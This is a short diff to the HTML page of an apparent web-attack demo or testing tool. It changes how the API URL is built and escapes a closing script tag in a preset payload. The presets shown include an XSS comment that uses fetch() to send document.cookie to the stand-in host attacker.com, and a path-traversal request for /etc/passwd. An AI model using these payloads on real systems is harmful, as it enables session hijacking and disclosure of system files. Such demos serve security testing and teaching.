@@ -350,7 +350,7 @@
     </div>
 
     <script>
-        const API_URL = "http://" + window.location.hostname + ":8001";
+        const API_URL = window.location.protocol + "//" + window.location.hostname + ":8001";
 
         const PRESET_EXPLOITS = {
             sqli: {
@@ -359,7 +359,7 @@
             },
             xss: {
                 path: "/comment/submit",
-                body: "comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
+                body: "comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)<\\/script>"
             },
             traversal: {
                 path: "/download?file=../../../../../../etc/passwd",
